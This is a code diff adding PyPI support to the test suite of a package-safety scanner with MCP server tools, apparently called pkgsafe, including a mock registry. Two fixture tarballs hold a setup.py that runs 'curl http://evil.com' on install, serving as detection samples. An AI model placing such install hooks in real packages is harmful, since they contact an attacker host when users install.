@@ -4,8 +4,10 @@ import (
 	"archive/tar"
 	"bytes"
 	"compress/gzip"
+	"crypto/sha256"
 	"crypto/sha512"
 	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"io"
 	"net/http"
@@ -17,6 +19,7 @@ import (
 
 	"github.com/niyam-ai/pkgsafe/internal/cache"
 	rnpm "github.com/niyam-ai/pkgsafe/internal/registry/npm"
+	rpypi "github.com/niyam-ai/pkgsafe/internal/registry/pypi"
 	"github.com/niyam-ai/pkgsafe/internal/types"
 )
 
@@ -33,6 +36,10 @@ func TestMCPServer(t *testing.T) {
 	oldURL := rnpm.DefaultRegistryURL
 	rnpm.DefaultRegistryURL = srv.URL
 	defer func() { rnpm.DefaultRegistryURL = oldURL }()
+
+	oldPyPIURL := rpypi.DefaultRegistryURL
+	rpypi.DefaultRegistryURL = srv.URL
+	defer func() { rpypi.DefaultRegistryURL = oldPyPIURL }()
 
 	// Write a temp policy file for testing
 	tempDir := t.TempDir()
@@ -579,6 +586,53 @@ func TestMCPServer(t *testing.T) {
 		}
 	})
 
+	// 15.5. validate_package_install supports PyPI
+	t.Run("validate_package_install PyPI package", func(t *testing.T) {
+		res, err := callTool(t, "validate_package_install", map[string]any{
+			"ecosystem":    "pypi",
+			"name":         "pypi-fixture",
+			"version":      "1.0.0",
+			"requested_by": "human",
+		})
+		if err != nil {
+			t.Fatal(err)
+		}
+		if res.IsError {
+			t.Fatalf("tool execution error: %s", res.Content[0].Text)
+		}
+
+		var valRes ValidatePackageInstallResult
+		if err := json.Unmarshal([]byte(res.Content[0].Text), &valRes); err != nil {
+			t.Fatal(err)
+		}
+
+		if valRes.Decision != "warn" && valRes.Decision != "block" {
+			t.Errorf("expected decision warn or block for pypi-fixture, got %s", valRes.Decision)
+		}
+	})
+
+	// 15.6. validate_install_command parses pip install requests
+	t.Run("validate_install_command pip install requests", func(t *testing.T) {
+		res, err := callTool(t, "validate_install_command", map[string]any{
+			"command": "pip install requests==2.31.0",
+		})
+		if err != nil {
+			t.Fatal(err)
+		}
+		if res.IsError {
+			t.Fatalf("tool execution error: %s", res.Content[0].Text)
+		}
+
+		var vicRes ValidateInstallCommandResult
+		if err := json.Unmarshal([]byte(res.Content[0].Text), &vicRes); err != nil {
+			t.Fatal(err)
+		}
+
+		if vicRes.Ecosystem != "pypi" {
+			t.Errorf("expected ecosystem pypi, got %s", vicRes.Ecosystem)
+		}
+	})
+
 	// 16. MCP server starts without printing non-JSON text to stdout
 	t.Run("starts clean", func(t *testing.T) {
 		inReader := strings.NewReader("")
@@ -626,6 +680,12 @@ func testRegistryServer(t *testing.T, versions map[string]string, latest string)
 			"package/package.json": pkgJSON,
 		})
 	}
+	tarballs["/tarballs/pypi-fixture-1.0.0.tar.gz"] = testMakeTarball(t, map[string]string{
+		"setup.py": "import os; os.system('curl http://evil.com')",
+	})
+	tarballs["/tarballs/requests-2.31.0.tar.gz"] = testMakeTarball(t, map[string]string{
+		"setup.py": "import os; os.system('curl http://evil.com')",
+	})
 
 	mux := http.NewServeMux()
 	var srv *httptest.Server
@@ -669,6 +729,50 @@ func testRegistryServer(t *testing.T, versions map[string]string, latest string)
 			}
 		}
 		_ = json.NewEncoder(w).Encode(body)
+	})
+	mux.HandleFunc("/pypi-fixture/json", func(w http.ResponseWriter, r *http.Request) {
+		tb := tarballs["/tarballs/pypi-fixture-1.0.0.tar.gz"]
+		hash := sha256.Sum256(tb)
+		md := rpypi.Metadata{
+			Info: rpypi.Info{
+				Name:    "pypi-fixture",
+				Version: "1.0.0",
+			},
+			Releases: map[string][]rpypi.File{
+				"1.0.0": {
+					{
+						Filename:    "pypi-fixture-1.0.0.tar.gz",
+						PackageType: "sdist",
+						URL:         srv.URL + "/tarballs/pypi-fixture-1.0.0.tar.gz",
+						Size:        int64(len(tb)),
+						Digests:     map[string]string{"sha256": hex.EncodeToString(hash[:])},
+					},
+				},
+			},
+		}
+		_ = json.NewEncoder(w).Encode(md)
+	})
+	mux.HandleFunc("/requests/json", func(w http.ResponseWriter, r *http.Request) {
+		tb := tarballs["/tarballs/requests-2.31.0.tar.gz"]
+		hash := sha256.Sum256(tb)
+		md := rpypi.Metadata{
+			Info: rpypi.Info{
+				Name:    "requests",
+				Version: "2.31.0",
+			},
+			Releases: map[string][]rpypi.File{
+				"2.31.0": {
+					{
+						Filename:    "requests-2.31.0.tar.gz",
+						PackageType: "sdist",
+						URL:         srv.URL + "/tarballs/requests-2.31.0.tar.gz",
+						Size:        int64(len(tb)),
+						Digests:     map[string]string{"sha256": hex.EncodeToString(hash[:])},
+					},
+				},
+			},
+		}
+		_ = json.NewEncoder(w).Encode(md)
 	})
 	mux.HandleFunc("/tarballs/", func(w http.ResponseWriter, r *http.Request) {
 		b, ok := tarballs[r.URL.Path]
